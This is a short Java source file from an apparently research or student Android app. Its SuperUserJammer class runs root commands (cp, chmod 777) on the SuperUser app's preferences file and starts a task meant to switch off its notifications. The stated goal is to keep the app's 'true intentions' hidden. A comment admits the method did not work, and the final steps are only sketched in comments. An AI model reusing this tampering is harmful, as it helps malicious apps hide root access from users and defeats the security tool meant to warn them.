package com.trustme.testsu;

import com.trustme.testsu.root.Root;
import com.trustme.testsu.utils.Constants;

/**
 * SuperUserJammer is trying to mess with SuerUser app
 *  in an attempt to protect the stealthiness of our app's
 *  true intentions.
 *  
 * @author sdemetr2
 *
 */
public class SuperUserJammer {
	//private static String TAG = "SuperUserJammer";
	
	public SuperUserJammer(){
		
	}
	
	/**
	 * Change the preferences of the SuperUser App disable the notifications 
	 * - Good Idea but it Didn't work. The preferences are not being read from the xml file but only
	 *    written to it
	 *  @author sdemetr2 
	 */
	public void changeSuperUserPrefs() {
		// copy the original prefs to another file that we grant world access
		String[] commands = new String[2];
		commands[0] = new String("cp " + Constants.SU_PREFERENCES_PATH + Constants.SU_PREFERENCES_FILENAME + " " +
				 Constants.SU_PREFERENCES_PATH + Constants.SU_PREFERENCES_FILENAME + ".bp " + "\n");
		commands[1] = new String("chmod 777 " + Constants.SU_PREFERENCES_PATH + Constants.SU_PREFERENCES_FILENAME + ".bp " + "\n");
		
		Root rt =new Root();
	    rt.execCommands(commands);
	    
	  //modify the world accessible file
	    ModifySuPrefsTask modify_su_prefs_task = new ModifySuPrefsTask();
	    modify_su_prefs_task.execute();
	    
	  //replace the original file with the modified world accessible file  
	  //restore the username groupname and privileges of the file
	    
	}

}
